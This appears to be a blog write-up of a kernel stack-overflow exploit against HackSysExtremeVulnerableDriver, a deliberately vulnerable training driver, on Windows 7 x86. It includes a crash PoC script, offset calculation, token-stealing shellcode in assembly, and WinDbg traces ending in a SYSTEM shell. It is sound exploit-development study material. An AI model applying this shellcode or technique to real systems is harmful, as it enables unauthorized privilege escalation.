---
layout:		post
title:		HackSysExtremeVulnerableDriver StackOverflow
author:		wooy0ung
tags:       hevd
category:	exploit
---

- 目录
{:toc #markdown-toc}

>[Analysis Environment]  
>guest machine: Windows 7 x86 sp0  
>host machine: Windows 10  
>necessary tools: VirtualKD[[here]](http://virtualkd.sysprogs.org/)、OSRloader[[here]](https://www.osronline.com/article.cfm?article=157)、HackSysExtremeVulnerableDriver[[here]](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver)、Windbg  
<!-- more -->


## 0x001 POC Test

vulnerability modules loaded
![](/assets/img/exploit/2018-08-03-hacksys-extreme-vulnerable-driver-stackoverflow/0x001.png)

generate enough strings
```
λ python pattern.py create 0x900
```

save this code，rename to poc.py
```
import sys
from ctypes import *
kernel32 = windll.kernel32
hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)
 
if not hevDevice or hevDevice == -1:
    print "[-] Couldn't get Device Driver handle."
    sys.exit(0)
 
buf = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7"
bufLength = len(buf)
 
kernel32.DeviceIoControl(hevDevice, 0x222003, buf, bufLength, None, 0, byref(c_ulong()), None)
```

execute it, and system will crash
```
Windows 7 Kernel Version 7600 MP (1 procs) Free x86 compatible
Built by: 7600.16385.x86fre.win7_rtm.090713-1255
Machine Name:
Kernel base = 0x83e4e000 PsLoadedModuleList = 0x83f96810
System Uptime: not available
nt!DbgLoadImageSymbols+0x47:
83e66fa6 cc              int     3
kd> g
KDTARGET: Refreshing KD connection
Access violation - code c0000005 (!!! second chance !!!)
72433372 ??              ???
kd> r
eax=00000000 ebx=a09a5da2 ecx=a09a46f2 edx=00000000 esi=879b4268 edi=879b41f8
eip=72433372 esp=8bc23be0 ebp=43327243 iopl=0         nv up ei ng nz na po nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010282
72433372 ??              ???
```

calculate the distance between buffer and retAddr
```
λ python pattern.py offset 0x72433372
0x820
```


## 000x2 How to Exploit it?

our exp may be normally in this form
```
#---[Setup]
pushad                             ; Save register state
mov eax, fs:[KTHREAD_OFFSET]       ; nt!_KPCR.PcrbData.CurrentThread
mov eax, [eax + EPROCESS_OFFSET]   ; nt!_KTHREAD.ApcState.Process
mov ecx, eax
mov ebx, [eax + TOKEN_OFFSET]      ; nt!_EPROCESS.Token
#---[Copy System PID token]
mov edx, 4                         ; PID 4 -> System
mov eax, [eax + FLINK_OFFSET] <-|  ; nt!_EPROCESS.ActiveProcessLinks.Flink
sub eax, FLINK_OFFSET           |
cmp [eax + PID_OFFSET], edx     |  ; nt!_EPROCESS.UniqueProcessId
jnz                           ->|  ; Loop !(PID=4)
mov edx, [eax + TOKEN_OFFSET]      ; System nt!_EPROCESS.Token
mov [ecx + TOKEN_OFFSET], edx      ; Replace PowerShell token
#---[Recover]
popad                              ; Restore register state
```

get fs Addr
```
kd> dg fs
                                  P Si Gr Pr Lo
Sel    Base     Limit     Type    l ze an es ng Flags
---- -------- -------- ---------- - -- -- -- -- --------
0030 83f7cc00 00003748 Data RW Ac 0 Bg By P  Nl 00000493
```

if don't know fs register much more，you can reference this article
[浅谈FS段寄存器在用户层和内核层的使用](https://blog.csdn.net/py_panyu/article/details/45011505)

we can find structure _KPRCB at 0x120 offset
```
kd> dt nt!_KPCR 83f7cc00
   +0x000 NtTib            : _NT_TIB
   +0x000 Used_ExceptionList : 0x99c56e6c _EXCEPTION_REGISTRATION_RECORD
   +0x004 Used_StackBase   : (null) 
   +0x008 Spare2           : (null) 
   +0x00c TssCopy          : 0x801e4000 Void
   +0x010 ContextSwitches  : 0x4a22d
   +0x014 SetMemberCopy    : 1
   +0x018 Used_Self        : 0x7ffdf000 Void
   +0x01c SelfPcr          : 0x83f7cc00 _KPCR
   +0x020 Prcb             : 0x83f7cd20 _KPRCB
   +0x024 Irql             : 0x1f ''
   +0x028 IRR              : 0
   +0x02c IrrActive        : 0
   +0x030 IDR              : 0xffffffff
   +0x034 KdVersionBlock   : 0x83f7bbc0 Void
   +0x038 IDT              : 0x80b95400 _KIDTENTRY
   +0x03c GDT              : 0x80b95000 _KGDTENTRY
   +0x040 TSS              : 0x801e4000 _KTSS
   +0x044 MajorVersion     : 1
   +0x046 MinorVersion     : 1
   +0x048 SetMember        : 1
   +0x04c StallScaleFactor : 0xaf8
   +0x050 SpareUnused      : 0 ''
   +0x051 Number           : 0 ''
   +0x052 Spare0           : 0 ''
   +0x053 SecondLevelCacheAssociativity : 0 ''
   +0x054 VdmAlert         : 0
   +0x058 KernelReserved   : [14] 0
   +0x090 SecondLevelCacheSize : 0
   +0x094 HalReserved      : [16] 0
   +0x0d4 InterruptMode    : 0
   +0x0d8 Spare1           : 0 ''
   +0x0dc KernelReserved2  : [17] 0
   +0x120 PrcbData         : _KPRCB
```

it is structure nt!_KTHREAD at 0x4 offset of nt!_KPRCB
```
kd> dt nt!_KPRCB 0x83f7cc00+0x120
   +0x000 MinorVersion     : 1
   +0x002 MajorVersion     : 1
   +0x004 CurrentThread    : 0x8763c5b8 _KTHREAD
   +0x008 NextThread       : (null) 
   +0x00c IdleThread       : 0x83f86280 _KTHREAD
   +0x010 LegacyNumber     : 0 ''
   +0x011 NestingLevel     : 0 ''
   +0x012 BuildType        : 0
   +0x014 CpuType          : 6 ''
   +0x015 CpuID            : 1 ''
   +0x016 CpuStep          : 0x9e09
   +0x016 CpuStepping      : 0x9 '	'
   +0x017 CpuModel         : 0x9e ''
```
now, get the firset target KTHREAD_OFFSET

check nt!_KTHREAD
```
kd> dt nt!_KTHREAD 0x8763c5b8
···
	+0x136 ForegroundBoost  : 0y0000
   +0x136 UnusualBoost     : 0y0000
   +0x137 Preempted        : 0 ''
   +0x138 AdjustReason     : 0 ''
   +0x139 AdjustIncrement  : 0 ''
   +0x13a PreviousMode     : 1 ''
   +0x13b Saturation       : 0 ''
   +0x13c SystemCallNumber : 0x6b
   +0x140 FreezeCount      : 0
   +0x144 UserAffinity     : _GROUP_AFFINITY
   +0x150 Process          : 0x858eb5d0 _KPROCESS
   +0x154 Affinity         : _GROUP_AFFINITY
   +0x160 IdealProcessor   : 0
   +0x164 UserIdealProcessor : 0
   +0x168 ApcStatePointer  : [2] 0x8763c5f8 _KAPC_STATE
   +0x170 SavedApcState    : _KAPC_STATE
   +0x170 SavedApcStateFill : [23]  "(???"
   +0x187 WaitReason       : 0x9 '	'
   +0x188 SuspendCount     : 0 ''
   +0x189 Spare1           : 0 ''
   +0x18a OtherPlatformFill : 0 ''
···
```
at offset 0x150 would be the ptr of nt!_KPROCESS, second target EPROCESS_OFFSET

continue on checking nt!_EPROCESS
```
kd> dt nt!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   +0x098 ProcessLock      : _EX_PUSH_LOCK
   +0x0a0 CreateTime       : _LARGE_INTEGER
   +0x0a8 ExitTime         : _LARGE_INTEGER
   +0x0b0 RundownProtect   : _EX_RUNDOWN_REF
   +0x0b4 UniqueProcessId  : Ptr32 Void
   +0x0b8 ActiveProcessLinks : _LIST_ENTRY
   +0x0c0 ProcessQuotaUsage : [2] Uint4B
   +0x0c8 ProcessQuotaPeak : [2] Uint4B
   +0x0d0 CommitCharge     : Uint4B
   +0x0d4 QuotaBlock       : Ptr32 _EPROCESS_QUOTA_BLOCK
   +0x0d8 CpuQuotaBlock    : Ptr32 _PS_CPU_QUOTA_BLOCK
   +0x0dc PeakVirtualSize  : Uint4B
   +0x0e0 VirtualSize      : Uint4B
   +0x0e4 SessionProcessLinks : _LIST_ENTRY
   +0x0ec DebugPort        : Ptr32 Void
···
```

attention on ActiveProcessLinks at offset 0xb8, it would be organized by double linked list, recording all the process

offset 0xb4 is UniqueProcessId, it's actually PID. Normally, system process would be given PID 4, find it!

offset 0x16c is ImageFileName, use to find "cmd.exe"
```
kd> dt nt!_EPROCESS
+0x14c ConsoleHostProcess : Uint4B
   +0x150 DeviceMap        : Ptr32 Void
   +0x154 EtwDataSource    : Ptr32 Void
   +0x158 FreeTebHint      : Ptr32 Void
   +0x160 PageDirectoryPte : _HARDWARE_PTE
   +0x160 Filler           : Uint8B
   +0x168 Session          : Ptr32 Void
   +0x16c ImageFileName    : [15] UChar
   +0x17b PriorityClass    : UChar
   +0x17c JobLinks         : _LIST_ENTRY
   +0x184 LockedPagesList  : Ptr32 Void
   +0x188 ThreadListHead   : _LIST_ENTRY
   +0x190 SecurityPort     : Ptr32 Void
   +0x194 PaeTop           : Ptr32 Void
   +0x198 ActiveThreads    : Uint4B
   +0x19c ImagePathHash    : Uint4B
   +0x1a0 DefaultHardErrorProcessing : Uint4B
   +0x1a4 LastThreadExitStatus : Int4B
```


## 0x003 Exploit it!
Windows kernel privilege escalation have to complete this work:

Find the EPROCESS structure corresponding to cmd.exe and system processes
-->
Then copy the access token (offset 0xf8) from system to "cmd.exe"
-->
Promote permissions to SYSTEM

Through debugging, the shellcode is already very clear
```
pushad
xor		eax,eax
mov 	eax,[fs:eax+0x124]
mov 	eax,[eax+0x150]
mov 	ecx,eax
mov 	edx,0x4
mov 	eax,[eax+0xb8]
sub 	eax,0xb8
cmp 	[eax+0xb4],edx
jnz 	0x1a
mov 	edx,[eax+0xf8]
mov 	[ecx+0xf8],edx
popad
pop 	ebp
ret 	0x8
```

Recommend a website, the assembly to machine code is simply invincible
[Online x86 / x64 Assembler and Disassembler](https://defuse.ca/online-x86-assembler.htm#disassembly)

After executing the shellcode, we must be able to exit normally. Let's see what happens after the shellcode is executed. First, setting a breakpoint.
```
kd> u $ip L10
00190000 cc              int     3
00190001 60              pushad
00190002 31c0            xor     eax,eax
00190004 648b8024010000  mov     eax,dword ptr fs:[eax+124h]
0019000b 8b8050010000    mov     eax,dword ptr [eax+150h]
00190011 89c1            mov     ecx,eax
00190013 ba04000000      mov     edx,4
00190018 8b80b8000000    mov     eax,dword ptr [eax+0B8h]
0019001e 2db8000000      sub     eax,0B8h
00190023 3990b4000000    cmp     dword ptr [eax+0B4h],edx
00190029 75ed            jne     00190018
0019002b 8b90f8000000    mov     edx,dword ptr [eax+0F8h]
00190031 8991f8000000    mov     dword ptr [ecx+0F8h],edx
00190037 61              popad
00190038 5d              pop     ebp
00190039 c20800          ret     8
kd> bp 00190037
kd> bl
     0 e Disable Clear  00190037     0001 (0001) 

kd> g
Breakpoint 0 hit
00190037 61              popad
kd> u $ip
00190037 61              popad
00190038 5d              pop     ebp
00190039 c20800          ret     8
0019003c 0000            add     byte ptr [eax],al
0019003e 0000            add     byte ptr [eax],al
00190040 0000            add     byte ptr [eax],al
00190042 0000            add     byte ptr [eax],al
00190044 0000            add     byte ptr [eax],al
kd> dd esp
9758fbc0  87d0e0c8 87d0e138 41414141 9758fbe0
9758fbd0  93bb7da2 00000000 93bb66f2 00000000
9758fbe0  9758fbfc 93bb7185 87d0e0c8 87d0e138
9758fbf0  862062b0 85e36b10 00000000 9758fc14
9758fc00  83e444bc 85e36b10 87d0e0c8 87d0e0c8
9758fc10  85e36b10 9758fc34 84045eee 862062b0
9758fc20  87d0e0c8 87d0e138 00000094 0458fcac
9758fc30  9758fc44 9758fcd0 84062cd1 85e36b10
kd> p
00190038 5d              pop     ebp
kd> dd esp
9758fbe0  9758fbfc 93bb7185 87d0e0c8 87d0e138
9758fbf0  862062b0 85e36b10 00000000 9758fc14
9758fc00  83e444bc 85e36b10 87d0e0c8 87d0e0c8
9758fc10  85e36b10 9758fc34 84045eee 862062b0
9758fc20  87d0e0c8 87d0e138 00000094 0458fcac
9758fc30  9758fc44 9758fcd0 84062cd1 85e36b10
9758fc40  862062b0 00000000 83e90701 00026901
9758fc50  00000002 ea0197d9 00000070 0038f734
```

View the vulnerability module address space(93bb2000 ~ 93bba000)
```
93ab9000 93ac3000   secdrv     (deferred)             
93ac3000 93ae4000   srvnet     (deferred)             
93ae4000 93af1000   tcpipreg   (deferred)             
93af1000 93b40000   srv2       (deferred)             
93b40000 93b91000   srv        (deferred)             
93b91000 93bb2000   vmhgfs     (deferred)             
93bb2000 93bba000   HEVD       (no symbols)           

Unloaded modules:
a0802000 a086c000   spsys.sys
88000000 88018000   parport.sys
88a95000 88aa2000   crashdmp.sys
88aa2000 88aac000   dump_storport.sys
88aac000 88ac4000   dump_LSI_SAS.sys
88ac4000 88ad5000   dump_dumpfve.sys
```

open vulnerability module by IDA, pay attention to the code
```
PAGE:000146FA ; int __stdcall StackOverflowIoctlHandler(_IRP *Irp, _IO_STACK_LOCATION *IrpSp)
PAGE:000146FA _StackOverflowIoctlHandler@8 proc near
PAGE:000146FA
PAGE:000146FA Irp= dword ptr  8
PAGE:000146FA IrpSp= dword ptr  0Ch
PAGE:000146FA
PAGE:000146FA mov     edi, edi
PAGE:000146FC push    ebp
PAGE:000146FD mov     ebp, esp
PAGE:000146FF mov     ecx, [ebp+IrpSp]
PAGE:00014702 mov     edx, [ecx+10h]
PAGE:00014705 mov     ecx, [ecx+8]
PAGE:00014708 mov     eax, 0C0000001h
PAGE:0001470D test    edx, edx
PAGE:0001470F jz      short loc_
```

return to Windbg, it's clearly Addr maybe the retAddr of StackOverflowIoctlHandler, controlling eip to return to this space
```
kd> dd esp
9758fbe0  9758fbfc 93bb7185 87d0e0c8 87d0e138
9758fbf0  862062b0 85e36b10 00000000 9758fc14
9758fc00  83e444bc 85e36b10 87d0e0c8 87d0e0c8
9758fc10  85e36b10 9758fc34 84045eee 862062b0
9758fc20  87d0e0c8 87d0e138 00000094 0458fcac
9758fc30  9758fc44 9758fcd0 84062cd1 85e36b10
9758fc40  862062b0 00000000 83e90701 00026901
9758fc50  00000002 ea0197d9 00000070 0038f734
kd> ub 93bb7185
HEVD+0x516d:
93bb716d e9e6000000      jmp     HEVD+0x5258 (93bb7258)
93bb7172 bba27dbb93      mov     ebx,offset HEVD+0x5da2 (93bb7da2)
93bb7177 53              push    ebx
93bb7178 e889beffff      call    HEVD+0x1006 (93bb3006)
93bb717d 59              pop     ecx
93bb717e 56              push    esi
93bb717f 57              push    edi
93bb7180 e875f5ffff      call    HEVD+0x46fa (93bb66fa)
kd> u 93bb66fa
HEVD+0x46fa:
93bb66fa 8bff            mov     edi,edi
93bb66fc 55              push    ebp
93bb66fd 8bec            mov     ebp,esp
93bb66ff 8b4d0c          mov     ecx,dword ptr [ebp+0Ch]
93bb6702 8b5110          mov     edx,dword ptr [ecx+10h]
93bb6705 8b4908          mov     ecx,dword ptr [ecx+8]
93bb6708 b8010000c0      mov     eax,0C0000001h
93bb670d 85d2            test    edx,edx
```

EXP executed successfully, whit opening a system permission cmd
![](/assets/img/exploit/2018-08-03-hacksys-extreme-vulnerable-driver-stackoverflow/0x002.png)

The full EXP is not posted, you can refer to the following link
[Part 10: Kernel Exploitation -> Stack Overflow](http://www.fuzzysecurity.com/tutorials/expDev/14.html)  
[如何利用Windows内核漏洞实现提权（下篇）](http://www.4hou.com/system/9010.html)